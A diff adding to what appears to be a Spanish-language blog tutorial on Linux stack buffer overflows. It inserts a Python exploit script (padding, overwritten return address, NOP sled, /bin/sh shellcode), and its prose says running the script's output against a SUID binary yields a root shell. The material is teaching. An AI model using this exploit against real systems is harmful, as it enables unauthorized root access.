@@ -99,6 +99,28 @@ Hacemos `r $(python -c 'print "A"*68 + "\x34\xf6\xff\xbf" + "\x90"*200 + "\x31\x
 
 ![](/assets/images/Stack-Buffer-Overflow-Linux/shell.png)
 
+Nos creamos un fichero exploit.py con el siguiente contenido:
 
+```python
+#!/usr/bin/python
+
+from struct import pack
+
+if __name__ == '__main__':
+        offset = 68
+        junk = "A"*offset
+        EIP = pack("<I", 0xbffff634) # \x34\xf6\xff\xbf
+        nops = "\x90"*200
+        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+        payload = junk + EIP + nops + shellcode
+
+        print payload
+
+```
+
+Y ahora ejecutamos el binario pasándole el output del resultado de ejecutar python exploit.py y vemos que nos devuelve una shell de root. Hemos conseguido redirigir el flujo de ejecución del programa para que se desplace hasta donde hemos sobreescrito la memoria con nuestro shellcode, para que lo ejecute y nos devuelva una shell, en este caso de root por tener el binaro permiso SUID.
+
+![](/assets/images/Stack-Buffer-Overflow-Linux/root.png)
 
 
